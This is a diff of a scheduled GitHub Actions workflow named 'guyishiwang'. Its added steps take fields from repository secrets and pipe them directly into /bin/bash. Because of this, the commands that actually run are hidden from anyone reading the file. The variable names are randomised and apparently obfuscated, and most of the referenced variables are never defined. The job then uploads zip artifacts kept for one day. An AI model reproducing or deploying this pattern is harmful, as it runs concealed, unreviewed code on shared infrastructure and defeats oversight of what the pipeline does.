@@ -1,30 +1,28 @@
 name: guyishiwang
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '14 0/6 * * *'
-jobs:  # 30782
+    - cron: '40 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guyishiwang
         env:
-          jtwyg6194: ${{ secrets.jtwyg6194 }}
+          anfin07150: ${{ secrets.anfin07150 }}
         run: |
-          echo $jtwyg6194 | jq -r .zqipo89 | /bin/bash
-          echo $o555 | jq -r .lkbd66984 | /bin/bash
-          echo $ly884 | jq -r .ltl98355 | /bin/bash
-          echo $sso9 | jq -r .qdm6052 | /bin/bash
-          echo $ah711 | jq -r .hamnu2206 | /bin/bash
-          echo $neu1643 | jq -r .h97883 | /bin/bash
-          echo $osl6 | jq -r .sqj152 | /bin/bash
-          echo $tdnw48 | jq -r .d662 | /bin/bash
-          echo $oxcfe048 | jq -r .hjrnj7368 | /bin/bash
-          echo $hp174 | jq -r .vny19 | /bin/bash
-          echo $di9 | jq -r .whu01 | /bin/bash
-          echo $u531 | jq -r .hhav4 | /bin/bash
-          echo $ue434 | jq -r .bqn1605 | /bin/bash
-          echo $hkrna8144 | jq -r .a92 | /bin/bash
+          printf '%s' "$anfin07150" | jq -r .eud335 | /bin/bash
+          printf '%s' "$rb23224" | jq -r .ezjj2 | /bin/bash
+          printf '%s' "$aokp4679" | jq -r .jl56868 | /bin/bash
+          printf '%s' "$dv5" | jq -r .n2 | /bin/bash
+          printf '%s' "$yk5063" | jq -r .j7905 | /bin/bash
+          printf '%s' "$dd2922" | jq -r .qvwcf5 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lNo5lyo0
+          path: "*.zip"
+          retention-days: 1
